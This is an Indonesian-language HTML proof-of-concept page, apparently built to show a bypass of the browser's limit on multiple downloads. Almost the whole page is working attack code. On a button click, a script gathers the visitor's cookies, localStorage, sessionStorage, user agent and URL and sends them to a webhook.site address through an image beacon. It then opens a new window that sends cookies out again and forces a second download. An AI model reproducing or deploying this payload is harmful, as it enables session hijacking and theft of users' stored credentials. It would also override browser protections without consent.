<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Bypass Multiple Download PoC</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            max-width: 400px;
            margin: 50px auto;
            text-align: center;
        }
        button {
            padding: 12px 24px;
            background: #d93025;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h2>Bypass Multiple Download + Cookie Exfiltration</h2>
    <p>Klik tombol untuk download 2 file & kirim cookie ke webhook.</p>
    <button onclick="executeBypass()">Jalankan Payload</button>

    <script>
        const WEBHOOK = "https://webhook.site/fd1f8ae0-9538-4102-9012-b6a41bbcfeb7";

        function downloadFile(filename, content) {
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        function hitWebhook(eventName, extraData = {}) {
            const params = new URLSearchParams({
                event: eventName,
                cookies: document.cookie || "NO_COOKIES",
                localStorage: JSON.stringify(localStorage) || "{}",
                sessionStorage: JSON.stringify(sessionStorage) || "{}",
                userAgent: navigator.userAgent,
                url: document.location.href,
                time: new Date().toISOString(),
                ...extraData
            });

            const img = new Image();
            img.src = `${WEBHOOK}?${params.toString()}`;
        }

        function executeBypass() {
            hitWebhook("initial_exfiltration", {
                stage: "1_of_2",
                message: "Cookie & storage dicuri dari tab utama"
            });

            downloadFile('file_pertama.txt', 'Halo, ini isi file teks sederhana.\nBaris kedua di sini.');

            const newWin = window.open('', '_blank');
            
            if (newWin) {
                newWin.document.write(`
                    <html><body>
                    <script>
                        const params = new URLSearchParams({
                            event: "bypass_success",
                            stage: "2_of_2",
                            file: "file_kedua.txt",
                            cookies: document.cookie || "NO_COOKIES",
                            time: new Date().toISOString()
                        });
                        
                        const img = new Image();
                        img.src = "${WEBHOOK}?" + params.toString();

                        const blob = new Blob(['Ini adalah file kedua. Bypass multiple download berhasil!'], { type: 'text/plain' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'file_kedua.txt';
                        document.body.appendChild(a);
                        a.click();
                        URL.revokeObjectURL(url);

                        setTimeout(() => { window.close(); }, 1500);
                    <\/script>
                    </body></html>
                `);
                newWin.document.close();
            }
        }
    </script>
</body>
</html>
